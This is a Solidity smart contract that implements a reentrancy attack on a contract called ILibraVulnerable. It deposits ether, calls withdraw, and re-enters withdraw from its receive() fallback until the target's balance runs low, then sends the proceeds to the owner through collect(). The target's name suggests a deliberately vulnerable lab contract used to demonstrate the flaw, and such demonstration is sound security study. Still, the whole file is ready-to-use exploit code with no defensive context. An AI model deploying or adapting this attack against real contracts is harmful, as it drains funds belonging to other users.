// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ILibraVulnerable {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract AttackerReentrancy {
    ILibraVulnerable public target;
    address public owner;
    uint256 public withdrawAmount;

    constructor(address _target) {
        target = ILibraVulnerable(_target);
        owner = msg.sender;
    }

    // Fund and start attack
    function attack() external payable {
        require(msg.value > 0, "send eth");
        // deposit to target
        withdrawAmount = msg.value;
        target.deposit{value: msg.value}();
        // trigger withdraw which will reenter
        target.withdraw(withdrawAmount);
    }

    receive() external payable {
        // when receiving funds, if the target still has balance, reenter
        uint256 targetBal = address(target).balance;
        if (targetBal >= withdrawAmount) {
            // reenter and attempt to withdraw the same amount again
            target.withdraw(withdrawAmount);
        }
    }

    function collect() external {
        payable(owner).transfer(address(this).balance);
    }
}
